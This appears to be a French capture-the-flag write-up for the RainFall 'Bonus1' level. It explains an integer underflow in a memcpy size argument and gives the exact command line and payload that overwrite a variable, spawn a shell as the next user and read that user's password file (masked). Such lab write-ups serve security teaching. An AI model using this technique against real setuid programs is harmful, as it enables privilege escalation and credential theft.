# Level Bonus1

Apres avoir analyse l'executable avec `ghidra` puis l'avoir reecrit de maniere plus lisible on peut voir clairement que passer le niveau en executant un shell nous devons avoir notre entier avec la valeur `0x574f4c46`

Nous avons deux soucis le premier etant que la valeur max pour valider cette premiere condition sois `9` et le second malgres une multiplication par `4` dans le troisieme parametre de `memcpy` on ne peut pas ecrire suffisament de caractere

Le troisieme parametre de `memcpy` etant un `size_t` et le manque de check pour les valeurs negatifs nous allons bypass cette condition en provoquant un `integer underflow`

Notre objectif etant de trouver un nombre negatif qui une fois multiplier par 4 et cast dans un `size_t` nous donne le resultat `44` pour cela nous utilisons notre petit programme qui fera la meme operation que l'executable en commencant par l'`INT_MIN`

```bash
➜  rainfall git:(main) ✗ gcc bonus1/ressources/find_int.c && ./a.out
needed offset: 44       int: -2147483637
```

Si on essaye `-2147483637` comme premier argument nous pouvons voir qu'on passe les conditions pour executer le shell

```bash
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "\x57\x4f\x4c\x46"[::-1] * 11') 
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
*********************************************
$ 
```